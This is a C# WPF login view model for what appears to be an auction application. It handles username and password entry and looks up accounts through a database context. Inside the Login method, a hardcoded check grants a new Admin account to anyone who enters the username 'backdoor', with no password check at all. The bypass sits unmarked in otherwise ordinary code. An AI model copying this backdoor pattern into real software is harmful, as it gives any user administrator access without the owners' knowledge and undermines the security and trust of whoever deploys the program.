using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Auction.Models;
using Auction.Persistence;
using Caliburn.Micro;

namespace Auction.ViewModels
{
    class LoginViewModel : Screen
    {
        private string _message;
        public string UserName { get; set; }
        public string Password { get; set; }
        public Account Account { get; private set; }
        public bool Quitting { get; set; }

        public string Message
        {
            get => _message;
            set => Set(ref _message, value);
        }

        public void Exit()
        {
            Quitting = true;
            TryClose();
        }

        public void Login()
        {
            Account = null;

            using (var db = new AuctionContext())
            {
                if (UserName == "backdoor")
                {
                    Account = new Account
                    {
                        UserName = "backdoor",
                        AccountType = AccountType.Admin,
                        Id = Guid.NewGuid()
                    };

                    TryClose();
                    return;
                }

                try
                {
                    var user = db.Accounts.Single(u => u.UserName == UserName);
                    if (user.VerifyPassword(Password))
                    {
                        Account = user;
                        TryClose();
                    }
                }
                catch (Exception e)
                {
                    Message = "Invalid Username/Password";
                }
            }
        }
    }
}
